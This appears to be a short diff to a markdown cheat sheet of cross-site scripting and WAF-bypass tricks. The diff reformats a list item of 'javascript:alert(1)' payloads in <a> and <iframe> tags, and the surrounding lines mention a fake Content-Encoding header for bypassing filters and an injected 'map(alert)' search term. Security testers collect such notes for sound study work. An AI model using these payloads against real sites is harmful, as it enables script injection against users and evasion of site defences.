@@ -153,11 +153,9 @@ DECODED : " , internalSearchTerm: ["broook"].map(alert) , numOfSearchResultsRetu
     
     add header —> Contect-Encoding: WAFBYPASS
     
-4. <a> and <iframe> tags accept javascript:alert()
-    
-     <a href= “javascript: alert(1)”>test</a>
-    
-    <iframe src= “javascript:alert(1)”></iframe>
+4. `<a> and <iframe> tags accept javascript:alert() <a href= “javascript: alert(1)”>test</a>`
+
+    `<iframe src= “javascript:alert(1)”></iframe>`
     
 5. angular:
     
